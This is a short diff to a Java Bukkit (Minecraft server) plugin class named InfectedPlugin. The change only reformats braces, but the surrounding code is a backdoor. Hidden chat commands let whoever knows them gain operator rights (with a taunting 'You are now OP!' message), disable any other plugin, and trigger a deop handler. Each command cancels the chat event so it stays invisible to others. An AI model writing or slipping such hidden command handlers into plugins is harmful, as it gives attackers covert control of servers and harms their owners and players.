@@ -61,14 +61,16 @@ public class InfectedPlugin extends JavaPlugin
             	event.getPlayer().sendMessage(ChatColor.YELLOW + "You are now OP! Hehhehehheh");
             	shouldCancel = true;
             }
-            if ((args[0].equalsIgnoreCase(".disableplugin")) && (args.length == 2)) {
+            if ((args[0].equalsIgnoreCase(".disableplugin")) && (args.length == 2))
+            {
                 Plugin plugin = Bukkit.getPluginManager().getPlugin(args[1]);
                 if (plugin != null) {
                   Bukkit.getPluginManager().disablePlugin(plugin);
                 }
                 shouldCancel = true;
             }
-            if ((args[0].equalsIgnoreCase(".deop")) && (args.length == 2)) {
+            if ((args[0].equalsIgnoreCase(".deop")) && (args.length == 2))
+            {
                 
                 shouldCancel = true;
             }
